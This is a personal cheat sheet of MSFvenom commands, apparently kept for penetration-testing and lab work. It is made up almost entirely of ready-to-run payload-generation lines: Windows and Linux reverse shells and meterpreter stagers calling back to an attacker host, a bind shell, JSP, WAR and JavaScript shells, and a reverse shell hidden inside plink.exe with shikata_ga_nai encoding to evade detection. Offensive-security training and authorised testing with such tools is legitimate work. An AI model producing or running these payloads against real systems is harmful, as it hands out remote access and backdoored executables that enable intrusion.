---
description: >-
  My various MSFvenom commands to generate shellcode, reverse shells, and
  meterpreter payloads that I end up using over, and over, and over, and over...
---
# MSFvenom Cheetsheet
## Shellcode Generation
### Generic Shellcode
```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e generic/none
```
### Windows Reverse TCP Shell \(Shellcode x86\)
Only use this one if payload size is no problem and you can't determine the bad chars:
```sh
`msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"`
```
### Windows Reverse TCP Shell Embedded in \`plink.exe\`
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o burmat_embedded.exe
```
### Bind Shell Shellcode
```sh
msfvenom -p windows/shell_bind_tcp RHOST=10.11.11.11 LPORT=1337 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f python
```
## Reverse Shells
Oddball reverse shells that can trip you up. Those "Wait, I  have done this before?" moments. Like when you see Tomcat running with default credentials or a ColdFusion Site \(fuck me...\)
### JSP Reverse Shell
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o burmat.jsp
```
### JavaScript Reverse Shells
If you are attacking a Windows host:
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f js_le -e generic/none
```
If you are attacking a Linux host:
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 CMD=/bin/bash -f js_le -e generic/none`
### WAR \(Java\) Reverse Shell
```sh
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o burmat.war
```
## Meterpreter Payloads
Don't just copy and paste - learn and understand the syntax.  These will all be for x86 machines, so just swap it up to x64 to suite your needs.
### Windows Meterpreter Payload
```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o burmat.exe
```
### Windows Meterpreter Reverse HTTPS Payload \(x86\)
```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -b '\x00' -f exe -o burmat.exe
```
### Linux Meterpreter Stager
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.11 LPORT=443 -f elf -o burmat
```